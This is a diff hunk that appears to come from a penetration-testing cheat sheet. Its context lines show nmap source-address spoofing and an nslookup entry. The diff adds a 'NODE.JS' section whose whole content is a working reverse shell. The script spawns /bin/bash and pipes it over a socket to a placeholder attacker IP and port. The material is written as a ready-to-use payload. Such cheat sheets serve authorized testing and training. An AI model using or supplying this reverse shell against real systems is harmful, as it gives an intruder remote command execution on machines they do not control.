@@ -2934,6 +2934,25 @@ nmap -S spoof_IP_here target_IP_here
 
 
 
+## NODE.JS
+```node
+# reverse shell
+(function(){
+  var net = require("net"),
+    cp = require("child_process"),
+    sh = cp.spawn("/bin/bash",[]);
+  var client = new net.Socket();
+  client.connect(port_here, "attacker_IP_here", function(){
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+  return /a/;
+})();
+```
+
+
+
 ## NSLOOKUP
 ```bash
 # find hostname of IP_here
